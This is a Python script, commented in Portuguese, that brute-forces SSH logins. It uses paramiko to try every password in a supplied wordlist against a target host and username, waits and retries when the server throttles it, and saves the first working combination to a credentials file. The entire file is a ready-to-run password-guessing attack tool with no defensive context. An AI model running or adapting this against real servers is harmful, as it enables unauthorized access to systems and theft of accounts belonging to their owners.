import paramiko
import socket
import time
from colorama import init, Fore

# inicia colorama
init()

GREEN = Fore.GREEN
RED   = Fore.RED
RESET = Fore.RESET
BLUE  = Fore.BLUE


def is_ssh_open(hostname, username, password):
    # inicia cliente ssh
    client = paramiko.SSHClient()
    # adiciona aos hosts conhecidos
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(hostname=hostname, username=username, password=password, timeout=3)
    except socket.timeout:
        # host inacessivel
        print(f"{RED}[!] Host: {hostname} is unreachable, timed out.{RESET}")
        returning = False
    except paramiko.AuthenticationException:
        print(f"[!] Invalid credentials for {username}:{password}")
        returning = False
    except paramiko.SSHException:
        print(f"{BLUE}[*] Quota exceeded, retrying with delay...{RESET}")
        # sleep de um min
        time.sleep(60)
        returning = is_ssh_open(hostname, username, password)
    else:
        # conexao estabelecida
        print(f"{GREEN}[+] Found combo:\n\tHOSTNAME: {hostname}\n\tUSERNAME: {username}\n\tPASSWORD: {password}{RESET}")
        returning = True
    finally:
        client.close()
        return returning


if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description="SSH Bruteforce Python script.")
    parser.add_argument("host", help="Hostname or IP Address of SSH Server to bruteforce.")
    parser.add_argument("-P", "--passlist", help="File that contain password list in each line.")
    parser.add_argument("-u", "--user", help="Host username.")

    # argumentos em parse
    args = parser.parse_args()
    host = args.host
    passlist = args.passlist
    user = args.user
    # le o arquivo
    passlist = open(passlist).read().splitlines()
    # brute-force-olha-o-pau-quebrando
    for password in passlist:
        if is_ssh_open(host, user, password):
            # se rodar, salva num arquivo
            open("credentials.txt", "w").write(f"{user}@{host}:{password}")
            break
